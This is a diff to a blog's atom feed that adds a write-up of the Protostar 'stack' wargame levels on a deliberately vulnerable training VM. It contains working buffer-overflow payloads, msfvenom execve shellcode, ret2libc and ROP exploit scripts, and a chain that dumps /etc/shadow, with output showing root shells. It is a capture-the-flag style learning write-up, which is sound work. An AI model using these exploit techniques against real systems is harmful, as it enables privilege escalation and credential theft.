@@ -4,7 +4,7 @@
   <title><![CDATA[Category: Vm | tcunha.github.io]]></title>
   <link href="http://tcunha.github.io/blog/categories/vm/atom.xml" rel="self"/>
   <link href="http://tcunha.github.io/"/>
-  <updated>2015-12-29T18:42:02+00:00</updated>
+  <updated>2015-12-29T20:17:09+00:00</updated>
   <id>http://tcunha.github.io/</id>
   <author>
     <name><![CDATA[tcunha]]></name>
@@ -12,6 +12,324 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Protostar Stack]]></title>
+    <link href="http://tcunha.github.io/blog/2015/12/29/protostar-stack/"/>
+    <updated>2015-12-29T18:58:57+00:00</updated>
+    <id>http://tcunha.github.io/blog/2015/12/29/protostar-stack</id>
+    <content type="html"><![CDATA[<h2>stack0</h2>
+
+<p>Nice refresher with regards to the volatile type qualifier. It is needed to
+prevent the compiler from optimizing it away, given that it&rsquo;s &ldquo;always&rdquo; set to
+zero (it might remove the if condition altogether). This is specially true for
+signal handlers:</p>
+
+<pre><code class="c">    sig_atomic_t    quit = 0;   /* Needs volatile! */
+
+    void
+    sigterm(int sig)
+    {
+        quit = 1;
+    }
+
+    while (quit != 0) { /* This might be transformed to while (true). */
+        ...
+    }
+</code></pre>
+
+<p>Given that the buffer is 64 bytes in size and the stack layout, writing one more
+will copy one over modified:</p>
+
+<pre><code>H +-------------+
+  | ...         |
+  | modified    |
+  | buffer[64]  |   /* Being power of two means that it's aligned. */
+  | ...         |
+L +-------------+
+</code></pre>
+
+<p>To trigger the condition, the following command can be issued:</p>
+
+<pre><code class="console">    $ python -c 'print "1" * 65'|./stack0
+    you have changed the 'modified' variable
+</code></pre>
+
+<h2>stack1</h2>
+
+<p>Like the above, given that the address of modified is four bytes above the
+buffer and (like the exercise says) by taking into account that this is a little
+endian platform (i386):</p>
+
+<pre><code class="console">    $ ./stack1 `python -c 'print "A" * 64 + "\x64\x63\x62\x61"'`    # or,
+    you have correctly got the variable to the right value
+    $ ./stack1 `python -c 'print "A" * 64 + "dcba"'`
+    you have correctly got the variable to the right value
+</code></pre>
+
+<h2>stack2</h2>
+
+<p>The same as the last one but with an environment variable:</p>
+
+<pre><code class="console">    $ env GREENIE="`python -c 'print "A" * 64 + "\x0a\x0d\x0a\x0d"'`" ./stack2
+    you have correctly modified the variable
+</code></pre>
+
+<h2>stack3</h2>
+
+<p>Disassembling, like the exercise says, with objdump and retrieving the address
+of the win() function yields the expected results:</p>
+
+<pre><code class="objdump">    $ objdump -d stack3|grep win
+    08048424 &lt;win&gt;:
+</code></pre>
+
+<pre><code class="console">    $ python -c 'print "A" * 64 + "\x24\x84\x04\x08"'|./stack3
+    calling function pointer, jumping to 0x08048424
+    code flow successfully changed
+</code></pre>
+
+<h2>stack4</h2>
+
+<p>A poor man&rsquo;s fuzzer can be used to guess the EIP address (and while at it, to
+take advantage of the redirect operator in gdb, like the exercise says):</p>
+
+<pre><code class="console">    $ python -c 'print "A" * offset + "B" * 4' &gt;/tmp/dump
+    $ gdb ./stack4
+    (gdb) r &lt;/tmp/dump
+</code></pre>
+
+<p>The offset should be incremented until (76) the program crashes with a segfault
+in the 0x42424242 address. Now that EIP is under control, the above can be used
+to obtain the address of win:</p>
+
+<pre><code class="objdump">    $ objdump -d stack4|grep win
+    080483f4 &lt;win&gt;:
+</code></pre>
+
+<pre><code class="console">    $ python -c 'print "A" * 76 + "\xf4\x83\x04\x08"'|./stack4
+    code flow successfully changed
+    Segmentation fault
+</code></pre>
+
+<p>The padding, like the exercise says, is added by the compiler.</p>
+
+<h2>stack5</h2>
+
+<p>This was kind of tricky, since the stack isn&rsquo;t in the same place inside and
+outside GDB. The environment and the arguments vector (ie argv) must be the
+same.</p>
+
+<p>First, brute-forced the number of bytes needed to overwrite EIP (76 in this
+case) and obtained the address of the stack with GDB:</p>
+
+<pre><code>$ python -c 'print "A" * 76 + "B" * 4 + "C" * 32' &gt;/tmp/boom
+$ env - TERM=xterm PWD=$PWD gdb /opt/protostar/bin/stack5
+(gdb) unset env LINES
+(gdb) unset env COLUMNS
+(gdb) show env
+TERM=xterm
+PWD=/tmp
+(gdb) r &lt;/tmp/boom
+(gdb) info registers
+(gdb) x/x $esp
+0xbffffe30: 0x43434343
+</code></pre>
+
+<p>Generated the shellcode with:</p>
+
+<pre><code class="console">    # msfvenom -p linux/x86/exec -f py -a x86 --platform linux CMD=/bin/sh
+    No encoder or badchars specified, outputting raw payload
+    Payload size: 43 bytes
+    buf =  ""
+    buf += "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f"
+    buf += "\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x08"
+    buf += "\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00\x57\x53"
+    buf += "\x89\xe1\xcd\x80"
+</code></pre>
+
+<p>As for the exploit:</p>
+
+<pre><code class="python">    #!/usr/bin/python
+
+    from struct import pack
+
+    off = 76
+    esp = pack("&lt;L", 0xbffffe30)
+
+    buf =  ""
+    buf += "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f"
+    buf += "\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x08"
+    buf += "\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00\x57\x53"
+    buf += "\x89\xe1\xcd\x80"
+
+    payload = "A" * off
+    payload += esp
+    payload += buf
+
+    print payload
+</code></pre>
+
+<p>Then, ensure that the environment is the same as the above (without changing
+directories due to $PWD):</p>
+
+<pre><code class="console">    $ (python /tmp/boom.py; cat)|   \
+      env - TERM=xterm PWD=$PWD     \
+      /opt/protostar/bin/stack5
+    id
+    uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
+</code></pre>
+
+<h2>stack6</h2>
+
+<p>With the usual methodology, it was noticed that EIP is under control when
+overwriting at least eighty characters. The traditional ret2libc with the
+system function and faking a stack frame works as expected:</p>
+
+<pre><code class="python">    #!/usr/bin/python
+
+    from struct import pack
+
+    off = 80
+    sys = pack("&lt;L", 0xb7ecffb0)    # system(3)
+    sh = pack("&lt;L", 0xbfffffb8)     # /bin/sh
+
+    payload = "A" * off
+    payload += sys
+    payload += "FAKE"
+    payload += sh
+
+    print payload
+</code></pre>
+
+<p>The /bin/sh address might need the usual guessing and setting a regular
+environment inside and outside GDB:</p>
+
+<pre><code class="console">    $ (python /tmp/boom.py; cat)|                   \
+      env - SHELL=/bin/sh TERM=xterm PWD=$PWD       \
+      /opt/protostar/bin/stack6
+    input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��AAAAAAAAAAA��AKE����
+    id
+    uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
+</code></pre>
+
+<p>As for the ROP one, I&rsquo;ve opted by using a rather pointless open(2), read(2),
+write(2) and finally system(3) chain to play around a little. The gadgets
+addresses can be obtained by using objdump. Jumping to the middle of a multiple
+pop sequence might be needed and that&rsquo;s okay.</p>
+
+<pre><code class="python">    #!/usr/bin/python
+
+    from struct import pack
+
+    off = 80
+
+    # int open(const char *, int);
+    openaddr = pack("&lt;L", 0xb7f537a0)
+    pop2 = pack("&lt;L", 0x08048452)
+    openpath = pack("&lt;L", 0xbfffffd6)       # SHADOW variable.
+    openflgs = pack("&lt;L", 0x0)              # O_RDONLY
+
+    # ssize_t read(int, void *, size_t);
+    readaddr = pack("&lt;L", 0xb7f53c00)
+    pop3 = pack("&lt;L", 0x08048576)
+    readfd = pack("&lt;L", 0x3)                # Only the standard ones are open.
+    readbuf = pack("&lt;L", 0xbffff73c)        # getpath() buffer.
+    readcnt = pack("&lt;L", 0x40)              # 64 bytes.
+
+    # ssize_t write(int, const void *, size_t);
+    writeaddr = pack("&lt;L", 0xb7f53c70)
+    writefd = pack("&lt;L", 0x2)               # stderr is unbuffered.
+    writebuf = readbuf
+    writecnt = readcnt
+
+    # int system(const char *);
+    sysaddr = pack("&lt;L", 0xb7ecffb0)
+    pointless = "FAKE"
+    syscmd = pack("&lt;L", 0xbfffffc7)         # SHELL variable.
+
+    payload = "A" * off
+    payload += openaddr + pop2 + openpath + openflgs
+    payload += readaddr + pop3 + readfd + readbuf + readcnt
+    payload += writeaddr + pop3 + writefd + writebuf + writecnt
+    payload += sysaddr + pointless + syscmd
+
+    print payload
+</code></pre>
+
+<p>Beware that the environment inherited from the parent may play tricks due to not
+being the same. Executing it through a clean environment all the time, such as
+the one below, solves this kind of issues:</p>
+
+<pre><code class="console">    $ (python /tmp/boom.py; cat)|                                  \
+      env - TERM=xterm PWD=$PWD SHELL=/bin/sh SHADOW=/etc/shadow   \
+      /opt/protostar/bin/stack6
+    input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�7��AAAAAAAAAAAA�7��R��
+    root:$6$gOA4/iAf$EMw.4yshZLZxjlf./VmnEVQ20QsEmdzZa73csPGYGG6KC.rid
+    uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
+</code></pre>
+
+<p>The stack with the above ROP will look like:</p>
+
+<pre><code>H +---------------------+
+  | ret (the variable)  |
+  | buffer [0x41 * 80]  | &lt;= 0xbffff73c
+  | open(2)             | &lt;= 0xb7f537a0
+  | POP POP RET         | &lt;= 0x08048452
+  | /etc/shadow         | &lt;= SHADOW variable.
+  | openflgs            | &lt;= O_RDONLY
+  | read(2)             | &lt;= 0xb7f53c00
+  | POP POP POP RET     | &lt;= 0x08048576
+  | 0x3                 |
+  | buffer              | &lt;= 0xbffff73c
+  | 0x40                |
+  | write(2)            | &lt;= 0xb7f53c70
+  | POP POP POP RET     | &lt;= 0x08048576
+  | 0x2                 |
+  | buffer              | &lt;= 0xbffff73c
+  | 0x40                |
+  | system(3)           | &lt;= 0xb7ecffb0
+  | FAKE                |
+  | /bin/sh             | &lt;= SHELL variable.
+L +---------------------+
+</code></pre>
+
+<h2>stack7</h2>
+
+<p>Like the one above, this also places restrictions in the address that we are
+allowed to jump to. Therefore, like the exercise says we need to bypass this
+restriction by returning to a text section.</p>
+
+<p>Decided with a straight ret opcode one, that pops the last value from the stack
+and updates EIP to that address (the system(3) function).</p>
+
+<pre><code class="python">    #!/usr/bin/python
+
+    from struct import pack
+
+    off = 80
+    ret = pack("&lt;L", 0x080484c2)    # the ret instruction (frame_dummy)
+    sys = pack("&lt;L", 0xb7ecffb0)    # system(3)
+    sh = pack("&lt;L", 0xbfffffbd)     # /bin/sh
+
+    payload = "A" * off 
+    payload += ret
+    payload += sys
+    payload += "FAKE"
+    payload += sh
+
+    print payload
+</code></pre>
+
+<pre><code class="console">    $ (python /tmp/boom.py; cat)|                   \
+      env - TERM=xterm PWD=$PWD SHELL=/bin/sh       \
+      /opt/protostar/bin/stack7
+    input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��AKE��
+    id
+    uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
+</code></pre>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[ROP Primer: 0.2]]></title>
